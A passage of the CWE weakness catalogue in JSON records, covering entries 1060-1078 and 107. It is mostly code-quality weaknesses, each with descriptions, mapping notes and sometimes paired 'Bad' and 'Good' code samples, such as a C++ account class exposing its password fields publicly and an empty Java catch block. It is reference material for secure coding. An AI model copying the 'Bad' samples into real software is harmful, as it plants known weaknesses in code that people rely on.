try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1060", "Name": "Excessive Number of Inefficient Server-Side Data Accesses", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product performs too many data queries without using efficient data processing functionality such as stored procedures.", "ExtendedDescription": "\n\nThis issue can make the product perform more slowly due to computational expense. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\n\nWhile the interpretation of \"too many data queries\" may vary for each product or developer, CISQ recommends a default maximum of 5 data queries for an inefficient function/procedure.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1120", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1061", "Name": "Insufficient Encapsulation", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product does not sufficiently hide the internal representation and implementation details of data or methods, which might allow external components or modules to modify data unexpectedly, invoke unexpected functionality, or introduce dependencies that the programmer did not intend.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "DemonstrativeExamples": [{"ID": "DX-212", "Entries": [{"IntroText": "The following example shows a basic user account class that includes member variables for the username and password as well as a public constructor for the class and a public method to authorize access to the user account."}, {"Nature": "Bad", "Language": "C++", "ExampleCode": "```\n\t#define MAX_PASSWORD_LENGTH 15\n\t#define MAX_USERNAME_LENGTH 15\n\tclass UserAccount\n\t{\n\t\t\tpublic:\n\t\t\t\t\tUserAccount(char *username, char *password)\n\t\t\t\t\t{\n\t\t\t\t\t\tif ((strlen(username) > MAX_USERNAME_LENGTH) ||\n\t\t\t\t\t\t(strlen(password) > MAX_PASSWORD_LENGTH)) {\n\t\t\t\t\t\t\tExitError(\"Invalid username or password\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\tstrcpy(this->username, username);\n\t\t\t\t\t\tstrcpy(this->password, password);\n\t\t\t\t\t}\n\t\t\tint authorizeAccess(char *username, char *password)\n\t\t\t{\n\t\t\t\t\tif ((strlen(username) > MAX_USERNAME_LENGTH) ||\n\t\t\t\t\t(strlen(password) > MAX_PASSWORD_LENGTH)) {\n\t\t\t\t\t\tExitError(\"Invalid username or password\");\n\t\t\t\t\t}\n```\n// if the username and password in the input parameters are equal to* \n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t *// the username and password of this account class then authorize access* \n\t\t\t\t\tif (strcmp(this->username, username) ||\n\t\t\t\t\tstrcmp(this->password, password))\n\t\t\t\t\t```\n\t\t\t\t\t\treturn 0;\n```\n// otherwise do not authorize access* \n\t\t\t\t\telse\n\t\t\t\t\t```\n\t\t\t\t\t\treturn 1;\n\t\t\t}\n\t\t\tchar username[MAX_USERNAME_LENGTH+1];\n\t\t\tchar password[MAX_PASSWORD_LENGTH+1];\n\t};\n```"}, {"BodyText": "However, the member variables username and password are declared public and therefore will allow access and changes to the member variables to anyone with access to the object. These member variables should be declared private as shown below to prevent unauthorized access and changes."}, {"Nature": "Good", "Language": "C++", "ExampleCode": "```\n\tclass UserAccount\n\t{\n\tpublic:\n\t\t...\n\tprivate:\n\t\tchar username[MAX_USERNAME_LENGTH+1];\n\t\tchar password[MAX_PASSWORD_LENGTH+1];\n\t};\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2010-3860", "Description": "variables declared public allow remote read of system properties such as user name and home directory.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3860"}], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}}
{"ID": "1062", "Name": "Parent Class with References to Child Class", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The code has a parent class that contains references to a child class, its methods, or its members.", "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1061", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1063", "Name": "Creation of Class Instance within a Static Code Block", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "A static code block creates an instance of a class.", "ExtendedDescription": "\n\nThis pattern identifies situations where a storable data element or member data element is initialized with a value in a block of code which is declared as static.\n\n\nThis issue can make the product perform more slowly by performing initialization before it is needed. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1176", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1064", "Name": "Invokable Control Element with Signature Containing an Excessive Number of Parameters", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains a function, subroutine, or method whose signature has an unnecessarily large number of\n\t\t\t\t\tparameters/arguments.", "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nWhile the interpretation of \"large number of parameters.\" may vary for each product or developer, CISQ recommends a default maximum of 7 parameters/arguments.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1120", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1065", "Name": "Runtime Resource Management Control Element in a Component Built to Run on Application Servers", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses deployed components from application servers, but it also uses low-level functions/methods for management of resources, instead of the API provided by the application server.", "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1066", "Name": "Missing Serialization Control Element", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains a serializable data element that does not\n\t\t\t\t\thave an associated serialization method.", "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably, e.g. by triggering an exception. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n\n\nAs examples, the serializable nature of a data element comes from a serializable SerializableAttribute attribute in .NET and the inheritance from the java.io.Serializable interface in Java.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1067", "Name": "Excessive Execution of Sequential Searches of Data Resource", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains a data query against an SQL table or view\n\t\t\t\t\tthat is configured in a way that does not utilize an index and may cause\n\t\t\t\t\tsequential searches to be performed.", "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1176", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1068", "Name": "Inconsistency Between Implementation and Documented Design", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The implementation of the product is not consistent with the\n\t\t\t\t\tdesign as described within the relevant documentation.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Technology", "Class": "Not Technology-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "ICS/OT", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1069", "Name": "Empty Exception Block", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "An invokable code block contains an exception handling block that does not contain any code, i.e. is empty.", "ExtendedDescription": "\n\nWhen an exception handling block (such as a Catch and Finally block) is used, but that block is empty, this can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1071", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "For every exception block add code that handles the specific exception in the way intended by the application."}], "DemonstrativeExamples": [{"ID": "DX-213", "Entries": [{"IntroText": "In the following Java example, the code catches an ArithmeticException."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class Main {\n\t\tpublic static void main(String[] args) { \n\t\t\tint a = 1; \n\t\t\tint b = 0; \n\t\t\tint c = 0;\n\t\t\ttry { \n\t\t\t\tc = a / b;\n\t\t\t} catch(ArithmeticException ae) { \n\t\t\t}\n\t\t}\n\t}\n```"}, {"BodyText": "Since the exception block is empty, no action is taken."}, {"BodyText": "In the code below the exception has been logged and the bad execution has been handled in the desired way allowing the program to continue in an expected way."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic class Main {\n\t\tpublic static void main(String[] args) { \n\t\t\tint a = 1; \n\t\t\tint b = 0; \n\t\t\tint c = 0;\n\t\t\ttry { \n\t\t\t\tc = a / b;\n\t\t\t} catch(ArithmeticException ae) { \n\t\t\t\tlog.error(\"Divided by zero detected, setting to -1.\"); \n\t\t\t\tc = -1;\n\t\t\t}\n\t\t}\n\t}\n```"}]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "107", "Name": "Struts: Unused Validation Form", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "An unused validation form indicates that validation logic is not up-to-date.", "ExtendedDescription": "It is easy for developers to forget to update validation logic when they remove or rename action form mappings. One indication that validation logic is not being properly maintained is the presence of an unused validation form.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1164", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "20", "ViewID": "700", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Resultant"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Quality Degradation"]}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Remove the unused Validation Form from the validation.xml file."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In the following example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for an online business site. The user will enter registration data and, through the Struts framework, the RegistrationForm bean will maintain the user data in the form fields using the private member variables. The RegistrationForm class uses the Struts validation capability by extending the ValidatorForm class and including the validation for the form fields within the validator XML file, validator.xml."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n```\n// private variables for registration form* \n\t\t\tprivate String name;\n\t\t\tprivate String address;\n\t\t\tprivate String city;\n\t\t\tprivate String state;\n\t\t\tprivate String zipcode;\n\t\t\t\n\t\t\t *// no longer using the phone form field* \n\t\t\t\n\t\t\t\n\t\t\t *// private String phone;* \n\t\t\tprivate String email;\n\t\t\t\n\t\t\tpublic RegistrationForm() {\n\t\t\t```\n\t\t\t\tsuper();\n\t\t\t}\n```\n// getter and setter methods for private variables* \n\t\t\t...}"}, {"Nature": "Bad", "Language": "XML", "ExampleCode": "```\n\t<form-validation>\n\t\t\t<formset>\n\t\t\t\t\t<form name=\"RegistrationForm\">\n\t\t\t\t\t\t\t<field property=\"name\" depends=\"required\">\n\t\t\t\t\t\t\t\t<arg position=\"0\" key=\"prompt.name\"/>\n\t\t\t\t\t\t\t</field>\n\t\t\t\t\t\t\t<field property=\"address\" depends=\"required\">\n\t\t\t\t\t\t\t\t<arg position=\"0\" key=\"prompt.address\"/>\n\t\t\t\t\t\t\t</field>\n\t\t\t\t\t\t\t<field property=\"city\" depends=\"required\">\n\t\t\t\t\t\t\t\t<arg position=\"0\" key=\"prompt.city\"/>\n\t\t\t\t\t\t\t</field>\n\t\t\t\t\t\t\t<field property=\"state\" depends=\"required,mask\">\n\t\t\t\t\t\t\t\t<arg position=\"0\" key=\"prompt.state\"/>\n\t\t\t\t\t\t\t\t<var>\n\t\t\t\t\t\t\t\t\t<var-name>mask</var-name>\n\t\t\t\t\t\t\t\t\t<var-value>[a-zA-Z]{2}</var-value>\n\t\t\t\t\t\t\t\t</var>\n\t\t\t\t\t\t\t</field>\n\t\t\t\t\t\t\t<field property=\"zipcode\" depends=\"required,mask\">\n\t\t\t\t\t\t\t\t<arg position=\"0\" key=\"prompt.zipcode\"/>\n\t\t\t\t\t\t\t\t<var>\n\t\t\t\t\t\t\t\t\t<var-name>mask</var-name>\n\t\t\t\t\t\t\t\t\t<var-value>\\d{5}</var-value>\n\t\t\t\t\t\t\t\t</var>\n\t\t\t\t\t\t\t</field>\n\t\t\t\t\t\t\t<field property=\"phone\" depends=\"required,mask\">\n\t\t\t\t\t\t\t\t<arg position=\"0\" key=\"prompt.phone\"/>\n\t\t\t\t\t\t\t\t<var>\n\t\t\t\t\t\t\t\t\t<var-name>mask</var-name>\n\t\t\t\t\t\t\t\t\t<var-value>^([0-9]{3})(-)([0-9]{4}|[0-9]{4})$</var-value>\n\t\t\t\t\t\t\t\t</var>\n\t\t\t\t\t\t\t</field>\n\t\t\t\t\t\t\t<field property=\"email\" depends=\"required,email\">\n\t\t\t\t\t\t\t\t<arg position=\"0\" key=\"prompt.email\"/>\n\t\t\t\t\t\t\t</field>\n\t\t\t\t\t</form>\n\t\t\t</formset>\n\t</form-validation>\n```"}, {"BodyText": "However, the validator XML file, validator.xml, for the RegistrationForm class includes the validation form for the user input form field \"phone\" that is no longer used by the input form and the RegistrationForm class. Any validation forms that are no longer required should be removed from the validator XML file, validator.xml."}, {"BodyText": "The existence of unused forms may be an indication to attackers that this code is out of date or poorly maintained."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1070", "Name": "Serializable Data Element Containing non-Serializable Item Elements", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains a serializable, storable data element such as a field or member,\n\t\t\t\t\tbut the data element contains member elements that are not\n\t\t\t\t\tserializable.", "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n\n\nAs examples, the serializable nature of a data element comes from a serializable SerializableAttribute attribute in .NET and the inheritance from the java.io.Serializable interface in Java.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1076", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1071", "Name": "Empty Code Block", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The source code contains a block that does not contain any code, i.e., the block is empty.", "ExtendedDescription": "\n\nEmpty code blocks can occur in the bodies of conditionals, function or method definitions, exception handlers, etc. While an empty code block might be intentional, it might also indicate incomplete implementation, accidental code deletion, unexpected macro expansion, etc. For some programming languages and constructs, an empty block might be allowed by the syntax, but the lack of any behavior within the block might violate a convention or API in such a way that it is an error.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1164", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "DemonstrativeExamples": [{"ID": "DX-213", "Entries": [{"IntroText": "In the following Java example, the code catches an ArithmeticException."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class Main {\n\t\tpublic static void main(String[] args) { \n\t\t\tint a = 1; \n\t\t\tint b = 0; \n\t\t\tint c = 0;\n\t\t\ttry { \n\t\t\t\tc = a / b;\n\t\t\t} catch(ArithmeticException ae) { \n\t\t\t}\n\t\t}\n\t}\n```"}, {"BodyText": "Since the exception block is empty, no action is taken."}, {"BodyText": "In the code below the exception has been logged and the bad execution has been handled in the desired way allowing the program to continue in an expected way."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic class Main {\n\t\tpublic static void main(String[] args) { \n\t\t\tint a = 1; \n\t\t\tint b = 0; \n\t\t\tint c = 0;\n\t\t\ttry { \n\t\t\t\tc = a / b;\n\t\t\t} catch(ArithmeticException ae) { \n\t\t\t\tlog.error(\"Divided by zero detected, setting to -1.\"); \n\t\t\t\tc = -1;\n\t\t\t}\n\t\t}\n\t}\n```"}]}, {"ID": "DX-214", "Entries": [{"IntroText": "The following code attempts to synchronize on an object, but does not execute anything in the synchronized block. This does not actually accomplish anything and may be a sign that a programmer is wrestling with synchronization but has not yet achieved the result they intend."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tsynchronized(this) { }\n```"}, {"BodyText": "Instead, in a correct usage, the synchronized statement should contain procedures that access or modify data that is exposed to multiple threads. For example, consider a scenario in which several threads are accessing student records at the same time. The method which sets the student ID to a new value will need to make sure that nobody else is accessing this data at the same time and will require synchronization."}, {"Nature": "Good", "ExampleCode": "```\n\tpublic void setID(int ID){\n\t\tsynchronized(this){\n\t\t\tthis.ID = ID;\n\t\t}\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1072", "Name": "Data Resource Access without Use of Connection Pooling", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product accesses a data resource through a database without using a\n\t\t\t\t\tconnection pooling capability.", "ExtendedDescription": "\n\nThis issue can make the product perform more slowly, as connection pools allow connections to be reused without the overhead and time consumption of opening and closing a new connection. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "405", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1073", "Name": "Non-SQL Invokable Control Element with Excessive Number of Data Resource Accesses", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains a client with a function or method that contains a large number of data accesses/queries that are sent through a data manager, i.e., does not use efficient database capabilities.", "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\n\nWhile the interpretation of \"large number of data accesses/queries\" may vary for each product or developer, CISQ recommends a default maximum of 2 data accesses per function/method.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "405", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1074", "Name": "Class with Excessively Deep Inheritance", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "A class has an inheritance level that is too high, i.e., it\n\t\t\t\t\thas a large number of parent classes.", "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nWhile the interpretation of \"large number of parent classes\" may vary for each product or developer, CISQ recommends a default maximum of 7 parent classes.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1093", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1075", "Name": "Unconditional Control Flow Transfer outside of Switch Block", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product performs unconditional control transfer (such as a\n\t\t\t\t\t\"goto\") in code outside of a branching structure such as a switch\n\t\t\t\t\tblock.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1120", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1076", "Name": "Insufficient Adherence to Expected Conventions", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product's architecture, source code, design, documentation,\n\t\t\t\t\tor other artifact does not follow required conventions.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1077", "Name": "Floating Point Comparison with Incorrect Operator", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The code performs a comparison such as an\n        equality test between two float (floating point) values, but\n        it uses comparison operators that do not account for the\n        possibility of loss of precision.", "ExtendedDescription": "\n\nNumeric calculation using floating point values can generate imprecise results because of rounding errors. As a result, two different calculations might generate numbers that are mathematically equal, but have slightly different bit representations that do not translate to the same mathematically-equal values. As a result, an equality test or other comparison might produce unexpected results.\n\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "697", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1078", "Name": "Inappropriate Source Code Style or Formatting", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The source code does not follow\n\t\t\t\tdesired style or formatting for indentation, white\n\t\t\t\tspace, comments, etc.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1076", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "DemonstrativeExamples": [{"ID": "DX-215", "Entries": [{"IntroText": "The usage of symbolic names instead of hard-coded constants is preferred."}, {"BodyText": "The following is an example of using a hard-coded constant instead of a symbolic name."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tchar buffer[1024];\n\t...\n\tfgets(buffer, 1024, stdin);\n```"}, {"BodyText": "If the buffer value needs to be changed, then it has to be altered in more than one place. If the developer forgets or does not find all occurrences, in this example it could lead to a buffer overflow."}, {"Nature": "Good", "Language": "C", "ExampleCode": "```\n\tenum { MAX_BUFFER_SIZE = 1024 };\n\t...\n\tchar buffer[MAX_BUFFER_SIZE];\n\t...\n\tfgets(buffer, MAX_BUFFER_SIZE, stdin);\n```"}, {"BodyText": "In this example the developer will only need to change one value and all references to the buffer size are updated, as a symbolic name is used instead of a hard-coded constant."}]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
